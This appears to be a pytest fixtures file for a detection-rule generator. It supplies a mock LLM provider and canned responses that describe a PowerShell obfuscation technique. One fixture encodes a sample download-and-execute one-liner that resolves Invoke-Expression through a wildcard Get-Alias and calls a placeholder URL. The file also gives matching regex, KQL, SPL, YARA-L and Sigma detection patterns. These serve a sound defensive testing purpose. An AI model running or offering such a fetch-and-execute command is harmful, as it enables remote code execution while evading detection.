"""Shared test fixtures for `tests/engine/`: a mock LLM provider and canned,
realistic response builders so detection/generation tests don't need a real
provider implementation (owned by a different builder) to exist or be network-
reachable.
"""

from __future__ import annotations

import base64
import json
import threading
from collections.abc import Callable

import pytest

from globwarden.engine.prompts import RULE_CONTENT_KEY, RULE_SECTION_KEY
from globwarden.llm.base import LLMProvider, LLMResponse
from globwarden.models import RuleType


class MockLLMProvider(LLMProvider):
    """In-memory `LLMProvider` implementation for tests.

    Two response-selection modes -- engine code now runs independent calls
    (a finding's generation call, a chunk's detection call) concurrently via a
    thread pool, so call order is no longer guaranteed:

    - `responses=[...]`: canned response texts handed out by call arrival
      order. Fine when every call should get equivalent content, or when
      order genuinely doesn't matter to the assertion. If more calls happen
      than responses were supplied, the last response is repeated.
    - `responder=callable`: `(system_prompt, user_prompt) -> response_text`,
      computed deterministically from what was actually sent. Use this
      whenever a test needs a *specific* response tied to a *specific*
      finding/chunk regardless of which thread's call lands first.

    Every call is recorded in `self.calls` for assertions about what prompts/
    images/json_mode the engine code actually sent. Recording (and the
    `responses`-mode counter) is lock-protected, since `complete()` can now be
    invoked concurrently from multiple threads.
    """

    name = "mock"

    def __init__(
        self,
        responses: list[str] | None = None,
        responder: Callable[[str, str], str] | None = None,
        available: bool = True,
    ):
        self._responses = list(responses or [])
        self._responder = responder
        self._call_count = 0
        self.calls: list[dict] = []
        self._available = available
        self._lock = threading.Lock()

    def complete(
        self,
        system_prompt: str,
        user_prompt: str,
        images: list[bytes] | None = None,
        json_mode: bool = False,
    ) -> LLMResponse:
        call_record = {
            "system_prompt": system_prompt,
            "user_prompt": user_prompt,
            "images": images,
            "json_mode": json_mode,
        }

        if self._responder is not None:
            # Invoked outside the lock, deliberately: a test simulating a
            # completion race (e.g. via a real `time.sleep()` inside the
            # responder) needs calls to actually run concurrently. Holding
            # the lock across the responder call would serialize every
            # invocation and silently turn an intended race into sequential
            # execution, making the test exercise far less real concurrency
            # than it claims to.
            text = self._responder(system_prompt, user_prompt)
            with self._lock:
                self.calls.append(call_record)
                self._call_count += 1
        else:
            with self._lock:
                self.calls.append(call_record)
                if self._responses:
                    index = min(self._call_count, len(self._responses) - 1)
                    text = self._responses[index]
                else:
                    text = ""
                self._call_count += 1

        return LLMResponse(text=text, model="mock-model-1", provider=self.name, raw=None)

    def is_available(self) -> bool:
        return self._available

    @property
    def call_count(self) -> int:
        return self._call_count


@pytest.fixture
def mock_provider_factory():
    """Factory fixture: `mock_provider_factory(responses=[...])` -> MockLLMProvider."""

    def _make(
        responses: list[str] | None = None,
        responder: Callable[[str, str], str] | None = None,
        available: bool = True,
    ) -> MockLLMProvider:
        return MockLLMProvider(responses=responses, responder=responder, available=available)

    return _make


# ---------------------------------------------------------------------------
# Canned response builders
# ---------------------------------------------------------------------------


def detection_response_json(findings: list[dict]) -> str:
    return json.dumps({"findings": findings})


def _b64(text: str) -> str:
    """Match the real `example_snippet_b64` schema `DETECTION_SYSTEM_PROMPT`
    asks for -- see `engine.detect._decode_example_snippet`."""
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def wildcard_finding_dict(finding_id: str = "f1") -> dict:
    return {
        "id": finding_id,
        "category": "wildcard_resolution",
        "technique_name": "Wildcard Get-Alias resolution of Invoke-Expression",
        "description": (
            "The report shows Get-Alias invoked with a wildcard pattern ('i*x') to "
            "resolve the 'iex' alias at runtime, then invokes the resolved command "
            "object directly via the call operator, so the literal string "
            "'Invoke-Expression' never appears in the command line."
        ),
        "example_snippet_b64": _b64("&(Get-Alias i*x) (irm https://example.com/a)"),
        "confidence": 0.92,
        "attack_mapping": "T1027.010 (parent: T1027)",
        "source_ref": "paragraph 2",
    }


def regex_response_json(pattern: str, explanation: str = "Flags wildcard alias resolution.") -> str:
    """Shape returned by the standalone, single-purpose regex prompt
    (`prompts.REGEX_SYSTEM_PROMPT`) -- used for the regex-retry path, which
    stays a narrow one-format call even though the primary generation call is
    now combined across every requested format (see `combined_response_json`)."""
    return json.dumps({"pattern": pattern, "explanation": explanation})


def combined_response_json(sections: dict[RuleType, tuple[str, str]]) -> str:
    """Build a combined generation-call response: one call now covers every
    requested rule type for a finding, in the shape
    `prompts.build_generation_system_prompt` asks for --
    `{"<rule_type>": {"<content_key>": "...", "explanation": "..."}, ...}`.

    `sections` maps each requested `RuleType` to its (content, explanation)
    pair. Content/section keys are pulled from `prompts.RULE_SECTION_KEY` /
    `RULE_CONTENT_KEY` rather than hardcoded, so a real key-naming change in
    prompts.py breaks this helper (and every test using it) loudly instead of
    tests quietly asserting against a shape production code no longer sends.
    """
    payload = {
        RULE_SECTION_KEY[rule_type]: {RULE_CONTENT_KEY[rule_type]: content, "explanation": explanation}
        for rule_type, (content, explanation) in sections.items()
    }
    return json.dumps(payload)


# Sample matching-expression content per format -- the *trimmed* shape
# GlobWarden now asks for (a bare regex line/clause, or a Sigma `detection:`
# block), not a complete standalone rule with title/metadata/logsource.

VALID_REGEX_PATTERN = r"(?i)&\s*\(\s*(get-alias|gal)\s+[a-z]*\*[a-z]*\s*\)"

VALID_KQL_LINE = 'ProcessCommandLine matches regex @"(?i)[a-z]*\\*[a-z]*"'

VALID_SPL_LINE = 'regex ScriptBlockText="(?i)\\(gal\\s+[a-z]*\\*[a-z]*\\)"'

VALID_YARA_L_LINE = "$e.target.process.command_line = /(?i)(get-alias|gal).{0,40}\\*/ nocase"

VALID_SIGMA_DETECTION_BLOCK = """\
selection:
  ScriptBlockText|contains:
    - '(gal '
    - '(Get-Alias '
condition: selection
"""
